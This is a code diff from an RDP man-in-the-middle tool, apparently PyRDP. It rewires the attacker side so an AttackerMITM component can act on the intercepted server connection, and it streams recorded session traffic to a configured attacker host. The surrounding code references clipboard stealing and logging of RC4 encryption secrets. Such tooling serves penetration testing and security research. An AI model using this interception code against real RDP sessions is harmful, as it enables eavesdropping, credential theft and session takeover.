@@ -13,12 +13,12 @@ from twisted.internet.protocol import Protocol
 from pyrdp.core import AwaitableClientFactory
 from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext
 from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, SegmentationPDUType
-from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, TwistedTCPLayer, \
-    VirtualChannelLayer
+from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, VirtualChannelLayer
 from pyrdp.logging import RC4LoggingObserver
 from pyrdp.logging.adapters import SessionLogger
 from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, SlowPathLogger, X224Logger
 from pyrdp.mcs import MCSClientChannel, MCSServerChannel
+from pyrdp.mitm.AttackerMITM import AttackerMITM
 from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer
 from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
@@ -31,6 +31,7 @@ from pyrdp.mitm.state import RDPMITMState
 from pyrdp.mitm.TCPMITM import TCPMITM
 from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
 from pyrdp.mitm.X224MITM import X224MITM
+from pyrdp.player import TwistedPlayerLayerSet
 from pyrdp.recording import FileLayer, Recorder, RecordingFastPathObserver, RecordingSlowPathObserver
 
 
@@ -54,6 +55,9 @@ class RDPMITM:
         self.serverLog = log.createChild("server")
         """Base logger for the server side"""
 
+        self.attackerLog = log.createChild("attacker")
+        """Base logger for the attacker side"""
+
         self.rc4Log = log.createChild("rc4")
         """Logger for RC4 secrets"""
 
@@ -69,7 +73,7 @@ class RDPMITM:
         self.server = RDPLayerSet()
         """Layers on the server side"""
 
-        self.attacker = TwistedTCPLayer()
+        self.player = TwistedPlayerLayerSet()
         """Layers on the attacker side"""
 
         self.recorder = Recorder([])
@@ -79,7 +83,7 @@ class RDPMITM:
         """MITM components for virtual channels"""
 
         serverConnector = self.connectToServer()
-        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.attacker, self.getLog("tcp"), self.recorder, serverConnector)
+        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.recorder, serverConnector)
         """TCP MITM component"""
 
         self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, serverConnector, self.startTLS)
@@ -97,6 +101,8 @@ class RDPMITM:
         self.fastPath: FastPathMITM = None
         """Fast-path MITM component"""
 
+        self.attacker: AttackerMITM = None
+
         self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
         self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
         self.client.slowPath.addObserver(SlowPathLogger(self.getClientLog("slowpath")))
@@ -106,6 +112,8 @@ class RDPMITM:
         self.server.mcs.addObserver(MCSLogger(self.getServerLog("mcs")))
         self.server.slowPath.addObserver(SlowPathLogger(self.getServerLog("slowpath")))
         self.server.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))
+
+        self.player.player.addObserver(LayerLogger(self.attackerLog))
 
         self.config.outDir.mkdir(parents=True, exist_ok=True)
         self.config.replayDir.mkdir(exist_ok=True)
@@ -159,12 +167,12 @@ class RDPMITM:
         await serverFactory.connected.wait()
 
         if self.config.attackerHost is not None and self.config.attackerPort is not None:
-            attackerFactory = AwaitableClientFactory(self.attacker)
+            attackerFactory = AwaitableClientFactory(self.player.tcp)
             reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)
 
             try:
                 await asyncio.wait_for(attackerFactory.connected.wait(), 1.0)
-                self.recorder.addTransport(self.attacker)
+                self.recorder.addTransport(self.player.tcp)
             except asyncio.TimeoutError:
                 self.log.error("Failed to connect to recording host: timeout expired")
 
@@ -226,6 +234,7 @@ class RDPMITM:
 
         self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
         self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath)
+        self.attacker = AttackerMITM(self.server.fastPath, self.player.player, self.log, self.recorder)
 
         LayerChainItem.chain(client, self.client.security, self.client.slowPath)
         LayerChainItem.chain(server, self.server.security, self.server.slowPath)
